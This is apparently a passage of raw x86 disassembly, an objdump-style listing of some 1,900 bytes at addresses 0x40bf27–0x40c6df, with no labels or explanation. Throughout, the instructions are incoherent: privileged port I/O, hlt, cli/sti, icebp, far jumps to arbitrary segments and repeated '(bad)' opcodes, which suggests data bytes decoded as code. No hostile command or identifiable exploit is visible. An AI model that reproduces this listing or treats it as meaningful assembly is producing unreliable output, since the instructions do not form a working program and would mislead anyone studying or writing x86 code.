  40bf27:	mov    dl,BYTE PTR [edx+0x4c8d7932]
  40bf2d:	outs   dx,BYTE PTR ds:[esi]
  40bf2e:	add    DWORD PTR [ecx-0x67f79173],ebp
  40bf34:	mov    ds:0x2211237c,al
  40bf39:	jo     0x40bf17
  40bf3b:	inc    esp
  40bf3c:	scas   al,BYTE PTR es:[edi]
  40bf3d:	and    edi,ecx
  40bf3f:	les    ebx,FWORD PTR [eax+0xd5b81ec]
  40bf45:	fadd   st(6),st
  40bf47:	pushf  
  40bf48:	push   ecx
  40bf49:	idiv   BYTE PTR [ecx]
  40bf4b:	push   ecx
  40bf4c:	adc    al,0x22
  40bf4e:	repnz ds call 0x9c76:0xc55044e3
  40bf57:	and    BYTE PTR [ecx+0x66f9b395],dh
  40bf5d:	das    
  40bf5e:	cmp    BYTE PTR ds:0xc51858dd,bh
  40bf64:	cs ret 0x3bff
  40bf68:	cmp    DWORD PTR [edx-0x2e],esp
  40bf6b:	fisttp DWORD PTR [edi-0x5d63aad0]
  40bf71:	inc    edx
  40bf72:	popa   
  40bf73:	mov    ss,eax
  40bf75:	cmc    
  40bf76:	out    0x4a,al
  40bf78:	mov    ebp,DWORD PTR cs:[esi+0x21]
  40bf7c:	push   0x2e
  40bf7e:	rcl    ch,0x4e
  40bf81:	test   DWORD PTR [ecx-0x55a8c522],ebx
  40bf87:	jo     0x40bf91
  40bf89:	push   ebp
  40bf8a:	adc    DWORD PTR [eax+0x2010ed0f],eax
  40bf90:	jg     0x40c007
  40bf92:	fdiv   QWORD PTR [ebx+0x4c54cea0]
  40bf98:	leave  
  40bf99:	adc    dl,0xd6
  40bf9c:	dec    esi
  40bf9d:	ja     0x40bf2b
  40bf9f:	and    al,0xb1
  40bfa1:	ins    BYTE PTR es:[edi],dx
  40bfa2:	adc    dh,bh
  40bfa4:	icebp  
  40bfa5:	mov    WORD PTR [eax-0x1e06d143],es
  40bfab:	adc    eax,esi
  40bfad:	dec    edi
  40bfae:	pop    esp
  40bfaf:	pop    ds
  40bfb0:	mov    dh,0xa0
  40bfb2:	lods   al,BYTE PTR ds:[esi]
  40bfb3:	sbb    BYTE PTR [ebp-0x1a709c2a],bh
  40bfb9:	adc    al,0x28
  40bfbb:	popf   
  40bfbc:	xchg   esi,eax
  40bfbd:	call   0x25c8:0xcdda359c
  40bfc4:	mov    ebp,DWORD PTR fs:[ebp+ecx*8-0x7d]
  40bfc9:	sub    BYTE PTR [edx+0x3f],cl
  40bfcc:	push   esp
  40bfcd:	inc    DWORD PTR [eax]
  40bfcf:	outs   dx,DWORD PTR ds:[esi]
  40bfd0:	fnsave [edi-0x3e]
  40bfd3:	add    al,0x4d
  40bfd5:	xchg   edx,eax
  40bfd6:	fwait
  40bfd7:	xchg   esp,eax
  40bfd8:	push   esp
  40bfd9:	cmc    
  40bfda:	xor    BYTE PTR [esp+edx*1+0x34a80b76],cl
  40bfe1:	and    eax,0xe86fb2db
  40bfe6:	push   ds
  40bfe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe8:	mov    dl,0x4
  40bfea:	sub    al,0x65
  40bfec:	rcr    BYTE PTR [eax+0x2fc99837],1
  40bff2:	mov    WORD PTR [eax],?
  40bff4:	arpl   WORD PTR [esi],sp
  40bff6:	fwait
  40bff7:	xor    cl,BYTE PTR [esi-0x12]
  40bffa:	mov    dh,0x51
  40bffc:	bswap  eax
  40bffe:	cmc    
  40bfff:	rol    BYTE PTR [eax-0x72447459],cl
  40c005:	imul   ebx,edi,0x77
  40c008:	ja     0x40bfb8
  40c00a:	or     cl,BYTE PTR [eax+eiz*1+0x73]
  40c00e:	int3   
  40c00f:	outs   dx,DWORD PTR ds:[esi]
  40c010:	push   ebp
  40c011:	adc    BYTE PTR [ebp-0x172896d5],bl
  40c017:	pop    esi
  40c018:	shl    BYTE PTR [ebx-0x74833001],cl
  40c01e:	ror    al,1
  40c020:	retf   0x5a22
  40c023:	test   al,0xc9
  40c025:	xchg   DWORD PTR [edx+eiz*1+0x7],esp
  40c029:	inc    edi
  40c02a:	mov    ebx,0x89394a73
  40c02f:	rcr    DWORD PTR [ebx-0x52],1
  40c032:	push   ds
  40c033:	rol    ecx,cl
  40c035:	dec    eax
  40c036:	pop    es
  40c037:	xchg   edi,eax
  40c038:	in     al,dx
  40c039:	iret   
  40c03a:	in     al,0x7e
  40c03c:	add    ecx,esi
  40c03e:	mov    dl,BYTE PTR [ebx-0x675fdf75]
  40c044:	int3   
  40c045:	mov    esp,esi
  40c047:	mov    al,0xec
  40c049:	jns    0x40c03b
  40c04b:	sti    
  40c04c:	pop    esi
  40c04d:	push   edx
  40c04e:	dec    eax
  40c04f:	mov    edx,0x601e2c7d
  40c054:	or     DWORD PTR [edx-0x58945bdf],esp
  40c05a:	gs or  eax,0x6c1aa75d
  40c060:	mov    ebx,0xf741fe32
  40c065:	lods   eax,DWORD PTR ds:[esi]
  40c066:	sar    bl,cl
  40c068:	aam    0x48
  40c06a:	inc    ebx
  40c06b:	or     ecx,DWORD PTR [edx+0x585de29f]
  40c071:	sbb    eax,0x2bedd7a8
  40c076:	popf   
  40c077:	xlat   BYTE PTR ds:[ebx]
  40c078:	fcmovu st,st(1)
  40c07a:	push   ebp
  40c07b:	push   es
  40c07c:	and    BYTE PTR [esi-0x50],dl
  40c07f:	sbb    eax,0x4699abe3
  40c084:	dec    edx
  40c085:	loope  0x40c105
  40c087:	mov    al,BYTE PTR ds:0x1fea1404
  40c08d:	jnp    0x40c0a3
  40c08f:	daa    
  40c090:	mov    al,ds:0xb3cb9b6a
  40c095:	xor    ah,BYTE PTR [esp+ecx*2]
  40c098:	mov    bh,0x63
  40c09a:	or     BYTE PTR [eax],bh
  40c09c:	nop
  40c09d:	mov    gs,WORD PTR [ecx+edx*1]
  40c0a0:	test   ebp,eax
  40c0a2:	gs xor eax,0x440f9c72
  40c0a8:	xor    eax,0x5e1decd1
  40c0ad:	(bad)  
  40c0ae:	and    bl,ch
  40c0b0:	jecxz  0x40c0d7
  40c0b2:	outs   dx,BYTE PTR ds:[esi]
  40c0b3:	addr16 mov ecx,0xf5f59b7a
  40c0b9:	and    eax,0x6e93628
  40c0be:	arpl   WORD PTR [ebx+0x4f],ax
  40c0c1:	out    0x79,eax
  40c0c3:	repnz xor DWORD PTR [eax],0x7014e63b
  40c0ca:	fdiv   QWORD PTR [edx]
  40c0cc:	or     eax,0x37b5fc05
  40c0d1:	cwde   
  40c0d2:	pop    ebx
  40c0d3:	fistp  WORD PTR [ecx+0x7bfce96e]
  40c0d9:	xchg   DWORD PTR ds:0x68ebc661,ecx
  40c0df:	mov    WORD PTR [ebp+edx*4-0x6ccaf0db],?
  40c0e6:	jnp    0x40c13d
  40c0e8:	adc    BYTE PTR [esi+0x68],0x71
  40c0ec:	xchg   BYTE PTR [edi-0xafe8c99],cl
  40c0f2:	dec    edi
  40c0f3:	xchg   edx,eax
  40c0f4:	pop    edi
  40c0f5:	fnstenv [ecx+0x6a]
  40c0f8:	mov    edi,0xf6469a32
  40c0fd:	loope  0x40c0e9
  40c0ff:	outs   dx,BYTE PTR ds:[esi]
  40c100:	fimul  DWORD PTR [ebp+0x7a4458e7]
  40c106:	stc    
  40c107:	mov    esi,0x979cc3d
  40c10c:	les    edi,FWORD PTR [ebp-0x51]
  40c10f:	jnp    0x40c142
  40c111:	jbe    0x40c147
  40c113:	mov    dl,0x49
  40c115:	je     0x40c159
  40c117:	pop    esi
  40c118:	mov    ebp,DWORD PTR ds:0xee93c8e6
  40c11e:	(bad)  
  40c11f:	mov    edx,0x564a504a
  40c124:	cmp    ch,bh
  40c126:	mov    eax,ds:0x19ac2fd0
  40c12b:	cmc    
  40c12c:	mov    DWORD PTR [esp+ebx*1],esp
  40c12f:	cmp    eax,DWORD PTR [edi+0x75f0640f]
  40c135:	inc    edx
  40c136:	inc    ecx
  40c137:	cmp    BYTE PTR [esi],bh
  40c139:	sar    DWORD PTR [ebp-0x28150e04],cl
  40c13f:	shl    DWORD PTR [esi],0x3f
  40c142:	add    bl,BYTE PTR [ecx-0x75]
  40c145:	add    al,0xe
  40c147:	test   BYTE PTR [esi-0xa],al
  40c14a:	xor    DWORD PTR [ebx+0x35],esp
  40c14d:	in     al,0x36
  40c14f:	push   esp
  40c150:	aas    
  40c151:	shl    BYTE PTR [eax],0xa8
  40c154:	out    0x5c,eax
  40c156:	jl     0x40c18d
  40c158:	fsubr  QWORD PTR [eax-0x28e4f3f5]
  40c15e:	imul   ecx,DWORD PTR [esi+0x10cf8b0],0x6f
  40c165:	xor    eax,0xff78b20b
  40c16a:	(bad)  
  40c16b:	out    0xaa,eax
  40c16d:	mov    edi,0x1d3fd247
  40c172:	xchg   esi,eax
  40c173:	icebp  
  40c174:	cmp    eax,0x505651e9
  40c179:	cwde   
  40c17a:	jo     0x40c1de
  40c17c:	sub    BYTE PTR [ebx-0xe],cl
  40c17f:	outs   dx,BYTE PTR ds:[esi]
  40c180:	lods   eax,DWORD PTR ds:[esi]
  40c181:	out    0x97,al
  40c183:	cmp    al,0x62
  40c185:	inc    eax
  40c186:	sbb    eax,0x7cedb44a
  40c18b:	lahf   
  40c18c:	mov    ecx,DWORD PTR [esi-0x58]
  40c18f:	fbld   TBYTE PTR [edx+esi*4+0x38]
  40c193:	jg     0x40c1b9
  40c195:	sub    eax,0xb809070c
  40c19a:	jmp    0x40c213
  40c19c:	inc    edi
  40c19d:	mov    ecx,0x7833be54
  40c1a2:	mov    ah,0x4e
  40c1a4:	icebp  
  40c1a5:	cmp    esi,DWORD PTR [edx+ebp*1-0x70]
  40c1a9:	bound  ebx,QWORD PTR [eax]
  40c1ab:	push   ecx
  40c1ac:	push   ebp
  40c1ad:	and    dl,BYTE PTR [ebp+ebp*8+0x46106a9]
  40c1b4:	push   ebx
  40c1b5:	dec    ecx
  40c1b6:	and    edi,edi
  40c1b8:	mov    dl,BYTE PTR [edi-0x21644ca0]
  40c1be:	mov    al,ds:0x6b0ad211
  40c1c3:	js     0x40c23b
  40c1c5:	imul   ebx,DWORD PTR [edi+esi*4+0x2],0xa
  40c1ca:	push   cs
  40c1cb:	adc    dh,dh
  40c1cd:	mov    eax,ds:0xed34e3b
  40c1d2:	scas   al,BYTE PTR es:[edi]
  40c1d3:	mov    esi,0xdcbd12c8
  40c1d8:	(bad)  
  40c1d9:	(bad)  
  40c1da:	push   edi
  40c1db:	sub    bh,al
  40c1dd:	and    DWORD PTR [ebp+0x79],esp
  40c1e0:	or     eax,0x51ad723f
  40c1e5:	mul    DWORD PTR [ebx+ecx*1]
  40c1e8:	inc    ebx
  40c1e9:	mov    esi,0xb5e1a8bc
  40c1ee:	or     BYTE PTR [eax+esi*2-0x2de57a7f],0x9f
  40c1f6:	mov    al,bh
  40c1f8:	mov    ch,0xf3
  40c1fa:	stos   BYTE PTR es:[edi],al
  40c1fb:	push   cs
  40c1fc:	xor    al,0x88
  40c1fe:	xor    bh,dh
  40c200:	ds mov ebx,0xdb270a19
  40c206:	in     eax,0x3a
  40c208:	jmp    0x223e2709
  40c20d:	shl    BYTE PTR [ecx+0x56d0db49],cl
  40c213:	test   DWORD PTR [ebp+ecx*1-0x34d65477],esi
  40c21a:	ds stc 
  40c21c:	jmp    0x40c1e7
  40c21e:	in     eax,dx
  40c21f:	outs   dx,BYTE PTR ds:[esi]
  40c220:	fs mov ch,0xd
  40c223:	(bad)  
  40c224:	fsubr  QWORD PTR ds:0xf5e4be10
  40c22a:	loope  0x40c24f
  40c22c:	dec    ebp
  40c22d:	sub    dl,BYTE PTR [ebp+eax*4-0x3b4b9795]
  40c234:	das    
  40c235:	in     eax,dx
  40c236:	scas   al,BYTE PTR es:[edi]
  40c237:	mov    dl,0xa9
  40c239:	(bad)  
  40c23b:	mov    ds:0xc4bc368e,al
  40c240:	fisubr DWORD PTR [edx]
  40c242:	mov    al,0xab
  40c244:	dec    edx
  40c245:	jmp    0x75ad:0xdb182f25
  40c24c:	pop    esp
  40c24d:	call   0x124b6180
  40c252:	out    0x8c,al
  40c254:	push   eax
  40c255:	cs mov dh,0x73
  40c258:	(bad)  [ecx-0x6c]
  40c25b:	jle    0x40c2b9
  40c25d:	mov    ch,0xb8
  40c25f:	mul    BYTE PTR [ecx-0x65b8461c]
  40c265:	mov    ch,0xae
  40c267:	mov    cl,0x9d
  40c269:	xor    esp,esi
  40c26b:	mov    dl,BYTE PTR [ebp+0xf2f702c]
  40c271:	adc    esp,DWORD PTR [ebx+0x29cc9537]
  40c277:	push   edx
  40c278:	sbb    BYTE PTR [edx+edi*4+0x41],dh
  40c27c:	sub    eax,0x1d000454
  40c281:	and    al,al
  40c283:	add    al,0x9f
  40c285:	loope  0x40c247
  40c287:	xchg   BYTE PTR [ecx-0x453bb7b1],al
  40c28d:	push   edx
  40c28e:	cmc    
  40c28f:	push   cs
  40c290:	sbb    eax,0x3d69c52f
  40c295:	pop    esp
  40c296:	adc    BYTE PTR [ecx+ebx*8-0x754c2298],bl
  40c29d:	adc    eax,0x2e5b1282
  40c2a2:	mul    dh
  40c2a4:	pop    ebp
  40c2a5:	scas   eax,DWORD PTR es:[edi]
  40c2a6:	arpl   WORD PTR [eax+0x6ec108db],di
  40c2ac:	mov    dl,0xda
  40c2ae:	fwait
  40c2af:	retf   
  40c2b0:	in     eax,dx
  40c2b1:	fidiv  WORD PTR ds:0xcccb6f63
  40c2b7:	and    BYTE PTR [esi],ah
  40c2b9:	or     al,0xca
  40c2bb:	xchg   ecx,eax
  40c2bc:	test   eax,0x3a61cdf4
  40c2c1:	ss inc ebx
  40c2c3:	mov    esp,0x597ae4b3
  40c2c8:	aaa    
  40c2c9:	sbb    edx,DWORD PTR [edx+0x6393c01d]
  40c2cf:	test   eax,0x7db5513
  40c2d4:	jg     0x40c350
  40c2d6:	xchg   edi,eax
  40c2d7:	loop   0x40c2ea
  40c2d9:	cli    
  40c2da:	sub    eax,DWORD PTR [ebx+edi*2+0x6e0f4334]
  40c2e1:	fwait
  40c2e2:	jo     0x40c33d
  40c2e4:	pop    ebx
  40c2e5:	cli    
  40c2e6:	stos   DWORD PTR es:[edi],eax
  40c2e7:	xor    eax,0x635488a7
  40c2ec:	or     cl,ah
  40c2ee:	lds    esp,FWORD PTR [edi+ebx*4+0x32cf5b06]
  40c2f5:	lahf   
  40c2f6:	and    cl,BYTE PTR [ebx+eiz*4+0x1ff4e756]
  40c2fd:	dec    ecx
  40c2fe:	data16 add BYTE PTR [ebp+0x4a],bl
  40c302:	jae    0x40c308
  40c304:	xchg   ebp,eax
  40c305:	nop
  40c306:	xlat   BYTE PTR ds:[ebx]
  40c307:	inc    edx
  40c308:	out    0xb0,eax
  40c30a:	cmp    bh,BYTE PTR [eax-0x1a9cef32]
  40c310:	int3   
  40c311:	btc    DWORD PTR [esi],eax
  40c314:	fild   WORD PTR [edi]
  40c316:	loopne 0x40c29d
  40c318:	mov    edx,0x6153d21c
  40c31d:	sub    DWORD PTR [ebx-0x1f463702],0x3e41bb74
  40c327:	cli    
  40c328:	sub    ah,bl
  40c32a:	pop    esi
  40c32b:	mov    DWORD PTR [edx],0xa966bc67
  40c331:	lock xor esp,DWORD PTR [esi-0x7df29f59]
  40c338:	addr16 inc edx
  40c33a:	call   0x3802:0xcb01f5ab
  40c341:	ds es sub ah,dl
  40c345:	arpl   WORD PTR [ebx+0x41],bp
  40c348:	ret    
  40c349:	xor    ebp,DWORD PTR [ecx-0x348964af]
  40c34f:	mov    eax,0x3640fea5
  40c354:	fild   DWORD PTR [edi]
  40c356:	push   ebx
  40c357:	or     bh,BYTE PTR ds:0x863a4065
  40c35d:	xchg   ebp,eax
  40c35e:	pop    edi
  40c35f:	into   
  40c360:	push   ss
  40c361:	sti    
  40c362:	scas   eax,DWORD PTR es:[edi]
  40c363:	cmc    
  40c364:	mov    ch,BYTE PTR [ebx]
  40c366:	in     eax,dx
  40c367:	sti    
  40c368:	sub    bl,bl
  40c36a:	(bad)  
  40c36b:	retf   0xdad5
  40c36e:	inc    esp
  40c36f:	jmp    0xc95c312f
  40c374:	aas    
  40c375:	jb     0x40c3da
  40c377:	xchg   dh,bl
  40c379:	adc    BYTE PTR [eax-0x74],dl
  40c37c:	xor    DWORD PTR [ecx],ecx
  40c37e:	add    DWORD PTR [edx+0x5f386c4c],esi
  40c384:	fnstsw WORD PTR [edi]
  40c386:	loop   0x40c379
  40c388:	sbb    eax,0x182a3047
  40c38d:	mov    esi,0x67a86ce8
  40c392:	jg     0x40c32f
  40c394:	cmp    esp,DWORD PTR [edx-0x76]
  40c397:	pop    edi
  40c398:	mov    eax,0x72ac36dc
  40c39d:	fist   WORD PTR [edx]
  40c39f:	popf   
  40c3a0:	shr    esi,0x7a
  40c3a3:	mov    esp,0xde72c6b8
  40c3a8:	dec    edx
  40c3a9:	pop    ebx
  40c3aa:	sbb    bl,BYTE PTR [edx]
  40c3ac:	mov    cl,0x36
  40c3ae:	cmc    
  40c3af:	add    BYTE PTR [esi+0x33],cl
  40c3b2:	aaa    
  40c3b3:	stos   BYTE PTR es:[edi],al
  40c3b4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40c3b6:	cmp    eax,0x3ec0fb46
  40c3bb:	test   ch,0x58
  40c3be:	jle    0x32b1b4f6
  40c3c4:	scas   eax,DWORD PTR es:[edi]
  40c3c5:	push   edx
  40c3c6:	je     0x40c3e3
  40c3c8:	mov    al,0x54
  40c3ca:	or     BYTE PTR [ebx+0x35177beb],ah
  40c3d0:	xor    eax,0x399ddc6f
  40c3d5:	retf   
  40c3d6:	data16 add BYTE PTR [ebp+edx*2+0x1e4e6b62],al
  40c3de:	mov    esi,0xb6e7cd45
  40c3e3:	sti    
  40c3e4:	or     edx,ebp
  40c3e6:	aaa    
  40c3e7:	sub    DWORD PTR [edi+0x1b8a3431],edi
  40c3ed:	mov    ebx,0x9ba170ea
  40c3f2:	lahf   
  40c3f3:	mov    ds:0x6ab18da5,eax
  40c3f8:	ret    0x9dbf
  40c3fb:	push   ebx
  40c3fc:	aam    0xbf
  40c3fe:	and    DWORD PTR [ecx+0x39],edi
  40c401:	add    BYTE PTR ds:0x2e35ffd6,al
  40c407:	mov    BYTE PTR [edi],al
  40c409:	adc    ebp,0x44
  40c40c:	sub    DWORD PTR [eax],0x76
  40c40f:	jp     0x40c476
  40c411:	or     eax,0xfef06ecd
  40c416:	pop    ecx
  40c417:	dec    esi
  40c418:	mov    ebp,0x52aadc9f
  40c41d:	push   esp
  40c41e:	sub    BYTE PTR [ebx+0x6f],bl
  40c421:	and    BYTE PTR [esp+edi*4-0x17],bh
  40c425:	dec    eax
  40c426:	xchg   ebp,eax
  40c427:	test   al,0xee
  40c429:	into   
  40c42a:	mov    bl,0xbb
  40c42c:	mov    ebp,gs
  40c42e:	not    DWORD PTR [ebx+0x68]
  40c431:	ret    0xc137
  40c434:	leave  
  40c435:	(bad)  
  40c436:	std    
  40c437:	push   0x94d84ced
  40c43c:	hlt    
  40c43d:	cld    
  40c43e:	je     0x40c44b
  40c440:	cdq    
  40c441:	pop    esp
  40c442:	mov    al,bl
  40c444:	movups XMMWORD PTR [esi+0x17],xmm4
  40c448:	cmp    DWORD PTR [eax+0x210d9364],ecx
  40c44e:	cmp    BYTE PTR [ebp-0x4e],dh
  40c451:	fild   DWORD PTR [edi]
  40c453:	add    DWORD PTR cs:[ecx+0x1409d99],edx
  40c45a:	ret    
  40c45b:	ror    DWORD PTR [ebx-0x65f5d678],1
  40c461:	lea    eax,[ecx+edi*8-0x6c0db756]
  40c468:	mov    ebx,0x11af09fd
  40c46d:	rcl    BYTE PTR ds:0x5f673729,1
  40c473:	enter  0x739b,0x2
  40c477:	dec    esi
  40c478:	push   esp
  40c479:	sbb    eax,0xb1dd93d0
  40c47e:	inc    eax
  40c47f:	push   edi
  40c480:	jne    0x40c44d
  40c482:	out    0xa3,al
  40c484:	(bad)  
  40c485:	ss sti 
  40c487:	sub    edx,edi
  40c489:	lock sub esp,edi
  40c48c:	cdq    
  40c48d:	std    
  40c48e:	inc    ebp
  40c48f:	stos   DWORD PTR es:[edi],eax
  40c490:	add    BYTE PTR [ebp-0x4b011e74],0x18
  40c497:	pop    edx
  40c498:	arpl   WORD PTR [ebx],di
  40c49a:	lds    eax,FWORD PTR [edx-0x2634fb8e]
  40c4a0:	mov    ah,0x8f
  40c4a2:	xor    esp,DWORD PTR [eax+0x61]
  40c4a5:	cmp    DWORD PTR [ecx+eiz*4],0x7
  40c4a9:	cli    
  40c4aa:	lahf   
  40c4ab:	mov    bl,dh
  40c4ad:	pop    ecx
  40c4ae:	scas   eax,DWORD PTR es:[edi]
  40c4af:	hlt    
  40c4b0:	adc    eax,0x18bda665
  40c4b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b6:	push   0x49
  40c4b8:	mov    ah,0x70
  40c4ba:	in     eax,0xce
  40c4bc:	shl    ebx,cl
  40c4be:	fs aaa 
  40c4c0:	out    0x4e,al
  40c4c2:	dec    edx
  40c4c3:	sbb    BYTE PTR [ebx+0x13],0x53
  40c4c7:	aas    
  40c4c8:	mov    bh,0x87
  40c4ca:	jnp    0x40c4a7
  40c4cc:	int3   
  40c4cd:	pop    eax
  40c4ce:	push   eax
  40c4cf:	imul   edx,DWORD PTR [ebp+0x126446ee],0x777f52bf
  40c4d9:	test   al,0x24
  40c4db:	sbb    eax,0x79813041
  40c4e0:	lods   eax,DWORD PTR ds:[esi]
  40c4e1:	jg     0x40c4a3
  40c4e3:	add    al,BYTE PTR [ecx-0x70]
  40c4e6:	and    bh,BYTE PTR [ebx+esi*1-0x24019365]
  40c4ed:	shl    BYTE PTR [ecx+esi*4+0x2606c2f7],0x41
  40c4f5:	cmp    al,0x32
  40c4f7:	shl    DWORD PTR [edi],0xf7
  40c4fa:	ins    BYTE PTR es:[edi],dx
  40c4fb:	outs   dx,BYTE PTR ds:[esi]
  40c4fc:	loop   0x40c52e
  40c4fe:	jne    0x40c551
  40c500:	fnop   
  40c502:	inc    edx
  40c503:	push   esp
  40c504:	aas    
  40c505:	inc    ecx
  40c506:	sbb    eax,0x441c00d9
  40c50b:	icebp  
  40c50c:	scas   eax,DWORD PTR es:[edi]
  40c50d:	sahf   
  40c50e:	xchg   bl,ah
  40c510:	pop    edx
  40c511:	jge    0x40c57b
  40c513:	imul   edi,DWORD PTR ds:0x95eb8442,0xffffff8b
  40c51a:	push   ebp
  40c51b:	jecxz  0x40c594
  40c51d:	mov    ch,0x8e
  40c51f:	xchg   DWORD PTR [edx-0x68],ecx
  40c522:	mov    eax,ds:0xf9c61215
  40c527:	shl    ch,1
  40c529:	das    
  40c52a:	bound  ecx,QWORD PTR [ebx]
  40c52c:	test   BYTE PTR [edx-0x68],bh
  40c52f:	sbb    eax,0x4a1a3348
  40c534:	scas   eax,DWORD PTR es:[edi]
  40c535:	push   ds
  40c536:	mov    dl,al
  40c538:	cmp    al,0x58
  40c53a:	(bad)  
  40c53c:	jbe    0x40c4c3
  40c53e:	adc    ah,bl
  40c540:	mov    bl,0xf
  40c542:	ret    0x2a6d
  40c545:	inc    edx
  40c546:	mov    bl,0x6f
  40c548:	mov    ebp,0x482185b6
  40c54d:	lods   eax,DWORD PTR ds:[esi]
  40c54e:	inc    ebp
  40c54f:	jo     0x40c570
  40c551:	in     al,dx
  40c552:	mov    WORD PTR [ecx+0x264e1894],?
  40c558:	sbb    eax,DWORD PTR [esi-0x50]
  40c55b:	sub    eax,0x7ff2cf40
  40c560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c561:	push   cs
  40c562:	pop    esi
  40c563:	cmp    esp,esp
  40c565:	sub    eax,0x8bbb03c4
  40c56a:	cld    
  40c56b:	pop    esp
  40c56c:	mov    al,ds:0x8b70fed7
  40c571:	add    BYTE PTR [eax],al
  40c573:	sub    dh,dl
  40c575:	loopne 0x40c538
  40c577:	hlt    
  40c578:	sbb    DWORD PTR [ebp-0x22],0xfffffff1
  40c57c:	cmp    DWORD PTR [esi+0x3c],0x9853a2ea
  40c583:	xchg   ecx,eax
  40c584:	mov    ah,0x81
  40c586:	mov    BYTE PTR [esp+edi*2+0x0],ch
  40c58a:	add    DWORD PTR [eax],esp
  40c58c:	sub    DWORD PTR [edi+0x3ec8ba30],ebx
  40c592:	out    0xf6,al
  40c594:	test   DWORD PTR [edx-0x2d],edi
  40c597:	sbb    al,0x3f
  40c599:	mov    dh,0xca
  40c59b:	jg     0x40c588
  40c59d:	push   edx
  40c59e:	in     al,dx
  40c59f:	retf   0xaae6
  40c5a2:	dec    ebp
  40c5a3:	jo     0x40c5b2
  40c5a5:	outs   dx,BYTE PTR ds:[esi]
  40c5a6:	sbb    DWORD PTR [edi],esp
  40c5a8:	cwde   
  40c5a9:	je     0x40c582
  40c5ab:	scas   eax,DWORD PTR es:[edi]
  40c5ac:	mov    edi,0xc40940b2
  40c5b1:	jecxz  0x40c5d3
  40c5b3:	xlat   BYTE PTR ds:[ebx]
  40c5b4:	push   eax
  40c5b5:	aas    
  40c5b6:	inc    edi
  40c5b7:	and    DWORD PTR [edi+0x2d],0xffffffa8
  40c5bb:	jno    0x40c5fb
  40c5bd:	fnsave [esi]
  40c5bf:	rcl    DWORD PTR [ecx-0x2a632672],cl
  40c5c5:	lock adc eax,0x66b7a7f2
  40c5cb:	in     al,dx
  40c5cc:	xor    eax,edi
  40c5ce:	addr16 aaa 
  40c5d0:	mov    ds:0xf941d49b,eax
  40c5d5:	stc    
  40c5d6:	inc    esp
  40c5d7:	jae    0x40c602
  40c5d9:	jecxz  0x40c62d
  40c5db:	jbe    0x40c62c
  40c5dd:	es pop ss
  40c5df:	dec    esi
  40c5e0:	jmp    0xcfbf:0x728bd7b0
  40c5e7:	fldcw  WORD PTR [eax+0x1e]
  40c5ea:	cs enter 0x5aa0,0x47
  40c5ef:	inc    esp
  40c5f0:	stos   BYTE PTR es:[edi],al
  40c5f1:	push   0x4c
  40c5f3:	sbb    eax,DWORD PTR [ebx+0x6d]
  40c5f6:	imul   BYTE PTR [edx-0x75]
  40c5f9:	out    0xc7,eax
  40c5fb:	or     BYTE PTR [esi],dh
  40c5fd:	jns    0x40c65f
  40c5ff:	pop    edi
  40c600:	adc    ah,BYTE PTR [edx-0x5dbda9b0]
  40c606:	test   al,0x4d
  40c608:	inc    edx
  40c609:	mov    cl,0x89
  40c60b:	je     0x40c5e0
  40c60d:	and    BYTE PTR [ebp+0x44],bh
  40c610:	push   DWORD PTR [edi+esi*4-0x673acaa1]
  40c617:	arpl   bx,si
  40c619:	sar    DWORD PTR [ebx+0x5b3441dd],cl
  40c61f:	and    al,0x57
  40c621:	xor    ebx,0x3003bdb5
  40c627:	pcmpgtw mm0,QWORD PTR [esi-0x5b]
  40c62b:	sub    eax,0x22b0aac5
  40c630:	nop
  40c631:	jns    0x40c60c
  40c633:	mov    cl,0x64
  40c635:	(bad)  
  40c636:	cld    
  40c637:	outs   dx,DWORD PTR ds:[esi]
  40c638:	adc    dl,BYTE PTR [eax+0x56982000]
  40c63e:	cmp    edi,DWORD PTR [ebx]
  40c640:	outs   dx,BYTE PTR ds:[esi]
  40c641:	cmp    DWORD PTR [ebp-0x71],edx
  40c644:	inc    eax
  40c645:	sahf   
  40c646:	dec    edi
  40c647:	jecxz  0x40c613
  40c649:	cmp    BYTE PTR [ebp+0x1a],bl
  40c64c:	ins    BYTE PTR es:[edi],dx
  40c64d:	xor    ecx,DWORD PTR [eax+eax*8+0x28]
  40c651:	sbb    DWORD PTR [ecx+0x48],ebx
  40c654:	out    0x5d,eax
  40c656:	dec    esp
  40c657:	jecxz  0x40c5e1
  40c659:	sub    DWORD PTR [ecx-0x5b],0xa3fad2a9
  40c660:	arpl   cx,si
  40c662:	outs   dx,BYTE PTR ds:[esi]
  40c663:	and    cl,BYTE PTR [ebx-0x23]
  40c666:	(bad)
  40c669:	iret   
  40c66a:	push   esp
  40c66b:	pop    ebx
  40c66c:	data16 fwait
  40c66e:	push   cs
  40c66f:	arpl   WORD PTR [esi],bp
  40c671:	outs   dx,BYTE PTR ds:[esi]
  40c672:	mov    ds:0xe2a6fa33,al
  40c677:	lock cmp ah,0x72
  40c67b:	xor    edi,DWORD PTR [ebx-0x35e99a27]
  40c681:	and    bh,BYTE PTR [ebx-0x64]
  40c684:	ret    0x26d9
  40c687:	retf   
  40c688:	outs   dx,BYTE PTR ds:[esi]
  40c689:	inc    BYTE PTR ds:0xc7d43002
  40c68f:	adc    BYTE PTR [ebx],0x2a
  40c692:	dec    edi
  40c693:	cld    
  40c694:	lea    edx,[eax+0x3f]
  40c697:	dec    eax
  40c698:	mov    ebp,0xa05a47e9
  40c69d:	dec    ebp
  40c69e:	cmp    esp,esp
  40c6a0:	ds int3 
  40c6a2:	cmp    al,0x54
  40c6a4:	call   0x379685aa
  40c6a9:	fistp  DWORD PTR [ebp-0x6912e240]
  40c6af:	je     0x40c66a
  40c6b1:	jbe    0x40c731
  40c6b3:	dec    ebx
  40c6b4:	mov    edi,0x4945098f
  40c6b9:	mov    edi,DWORD PTR [eax+0xb12ff77]
  40c6bf:	popa   
  40c6c0:	(bad)  
  40c6c1:	(bad)  
  40c6c2:	pop    esp
  40c6c3:	scas   al,BYTE PTR es:[edi]
  40c6c4:	repnz imul eax,DWORD PTR [esi+0x10dba46f],0x58
  40c6cc:	jo     0x40c6de
  40c6ce:	cmp    BYTE PTR [edi+0x52],bl
  40c6d1:	adc    al,0xe3
  40c6d3:	into   
  40c6d4:	xlat   BYTE PTR ds:[ebx]
  40c6d5:	sbb    DWORD PTR [ebp-0x3f],ecx
  40c6d8:	mov    eax,ds:0xbd537122
  40c6dd:	hlt    
  40c6de:	pop    ds
  40c6df:	add    eax,0x6b811d2e
